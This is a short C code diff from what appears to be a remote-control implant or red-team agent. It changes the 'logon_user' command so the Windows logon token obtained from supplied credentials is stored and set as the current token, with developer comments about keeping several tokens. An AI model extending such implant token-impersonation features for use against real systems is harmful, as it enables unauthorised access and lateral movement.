@@ -57,7 +57,7 @@ void list_processes(OutboundJsonDataStruct *response_struct);
 
 void user_to_sid(OutboundJsonDataStruct *response_struct, char *args);
 void get_sid(OutboundJsonDataStruct *response_struct);
-void login_user(OutboundJsonDataStruct *response_struct, char *args);
+void login_user(OutboundJsonDataStruct *response_struct, char *args, HeapStore *heapStorePointer);
 
 // ====================
 // Functions
@@ -205,7 +205,7 @@ int parse_command(char *command, char *args, OutboundJsonDataStruct *response_st
     else if (strcmp(command, "logon_user") == 0)
     {
         DEBUG_LOG("[COMMAND] logon_user\n");
-        login_user(response_struct, args);
+        login_user(response_struct, args, heapStorePointer);
     }
     else
     {
@@ -1207,7 +1207,7 @@ void user_to_sid(OutboundJsonDataStruct *response_struct, char *args)
     set_response_data(response_struct, buffer);
 }
 
-void login_user(OutboundJsonDataStruct *response_struct, char *args)
+void login_user(OutboundJsonDataStruct *response_struct, char *args, HeapStore *heapStorePointer)
 {
     // Parse arguments: username is required; domain and password are optional.
     char *context = NULL;
@@ -1255,6 +1255,10 @@ void login_user(OutboundJsonDataStruct *response_struct, char *args)
     //   - Save hToken in a global or heap structure.
     //   - Set it as the current token for subsequent operations.
     // Remember to close the token handle (CloseHandle(hToken)) when you're done with it.
+    // on this note^ don't think I need to, especially if I want to hold onto multiple tokens...
+
+    // set token to current token
+    set_current_stored_token(heapStorePointer, hToken);
 
     // add in a more desc message
     // eventually look up user token to get full username, btu that's broken for somereason, wouldn't compile.
